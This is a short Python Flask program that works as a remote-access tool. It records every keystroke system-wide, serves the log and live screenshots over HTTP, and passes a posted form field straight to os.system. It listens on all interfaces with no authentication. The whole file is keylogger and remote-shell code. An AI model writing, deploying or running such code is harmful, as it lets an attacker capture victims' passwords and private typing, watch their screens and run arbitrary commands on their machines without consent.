from flask import Flask, render_template, request
from keyboard import on_press
from pyscreenshot import grab
from os import system
app = Flask(__name__)
s = ""
def onPress(event):
    global s
    s += event.name + ' '
on_press(onPress)
@app.route("/clear")
def clear():
    global s
    s = ""
    return render_template("back.html")
@app.route("/screen.png")
def screen():
    grab().save("screen.png")
    return open("screen.png", "rb").read()
@app.route("/cmd", methods=["POST"])
def cmd():
    area=request.form.get("area")
    system(area)
    return render_template("back.html")
@app.route("/")
def index():
    global s
    return render_template("index.html", s=s)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1145)